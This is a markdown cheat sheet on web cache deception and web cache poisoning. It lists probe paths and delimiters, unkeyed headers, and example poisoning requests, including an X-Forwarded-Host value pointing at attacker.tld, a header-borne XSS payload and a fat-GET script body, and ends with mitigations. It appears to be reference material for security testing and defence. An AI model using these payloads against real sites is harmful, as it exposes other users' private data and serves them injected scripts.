# Web Cache Deception & Web Cache Poisoning

> Cache layers (CDN, reverse proxy, framework cache) can be tricked into storing sensitive data or attacker content under URLs that other users will request.

## Summary

- [Concepts](#concepts)
- [Web Cache Deception](#web-cache-deception)
- [Web Cache Poisoning](#web-cache-poisoning)
- [Unkeyed Inputs](#unkeyed-inputs)
- [Header-Based Poisoning](#header-based-poisoning)
- [Parameter Cloaking](#parameter-cloaking)
- [Fat GET](#fat-get)
- [Path Normalization Differences](#path-normalization-differences)
- [Mitigation](#mitigation)
- [References](#references)

## Concepts

- **Cache key**: the set of request attributes that uniquely identify a cached response. Typically `(scheme, host, path, optionally some headers/query)`.
- **Cache deception**: an authenticated response is cached because the cache thought the URL was static.
- **Cache poisoning**: an attacker influences the cached response (via unkeyed inputs) so other users get malicious content.

## Web Cache Deception

Classic Omer Gil attack:

```
GET /account.php/style.css      <- victim
```

App returns the account page (PHP ignores extra path). The CDN sees `.css`, caches the response. Attacker requests `/account.php/style.css` and gets victim's data.

### Variations

```
/profile/style.css
/profile.css
/profile/x.jpg
/profile;style.css
/profile?cb=1.css
/profile%0aanything.css
/profile/$/x.css
```

Probe extensions: `.css`, `.js`, `.jpg`, `.png`, `.gif`, `.woff`, `.ico`, `.svg`, `.json`, `.html`, `.xml`, `.txt`.

Probe path delimiters that the **origin** ignores but the **cache** parses as a static suffix:

```
;   #   ?   %00   %3b   %23   %0a   /   //   /./   /../
```

### Path normalization mismatch

If origin sees `/profile/static/avatar.jpg` and treats it as `/profile`, but cache treats it literally → vulnerable.

## Web Cache Poisoning

1. Identify **unkeyed inputs** that influence the response.
2. Pollute that input.
3. Wait for the cache to serve the poisoned response to other users.

## Unkeyed Inputs

Headers that often influence content but aren't in the cache key:

```
X-Forwarded-Host:
X-Forwarded-Scheme:
X-Forwarded-Proto:
X-Forwarded-Port:
X-Original-URL:
X-Rewrite-URL:
X-Host:
X-Forwarded-Server:
X-HTTP-Method-Override:
True-Client-IP:
X-Originating-IP:
X-Real-IP:
Forwarded:
```

### Probing with Param Miner

[Param Miner](https://github.com/PortSwigger/param-miner) (Burp extension) probes for unkeyed headers automatically. Use it in:

- "Guess headers" mode
- "Guess GET parameters" mode

## Header-Based Poisoning

Example — site uses `X-Forwarded-Host` to build canonical URLs:

```
GET /home HTTP/1.1
Host: target.tld
X-Forwarded-Host: attacker.tld

→ <link rel="canonical" href="https://attacker.tld/home">
```

If the response is cacheable, every visitor gets the poisoned canonical → SEO and phishing impact.

### XSS via X-Forwarded-Host

```
X-Forwarded-Host: attacker.tld'"><script>alert(1)</script>
```

Cached → every user gets the XSS.

## Parameter Cloaking

Different parsers split query strings differently. Cache normalizes one way, origin another:

```
GET /home?utm=1&utm=<payload>
GET /home?utm=1;utm=<payload>
GET /home?utm=1&utm[]=<payload>
```

Cache key may include only `utm=1`, while origin sees `utm=<payload>`.

## Fat GET

Some servers accept a body on GET. Cache keys ignore body → poison the cache with a body-supplied parameter.

```
GET /home?cb=1 HTTP/1.1
Content-Length: 26

utm=<script>alert(1)</script>
```

## Path Normalization Differences

```
/api/users/../static/x.png
/api/users%2f..%2fstatic%2fx.png
//api/users/x.png
/api//users/x.png
```

The cache and origin may disagree on which resource is served / cached.

## Mitigation

- Mark **personalized responses** as `Cache-Control: private, no-store`.
- Make all unkeyed inputs **part of the cache key** (or strip them server-side before processing).
- Normalize paths consistently between cache and origin.
- Use a small allow-list of cacheable URL patterns; everything else `no-store`.
- Don't ignore extra path segments in your routing framework (`/profile/style.css` should 404, not return `/profile`).

## References

- [PortSwigger — Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger — Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Omer Gil — Web Cache Deception](https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html)
- [Param Miner](https://github.com/PortSwigger/param-miner)
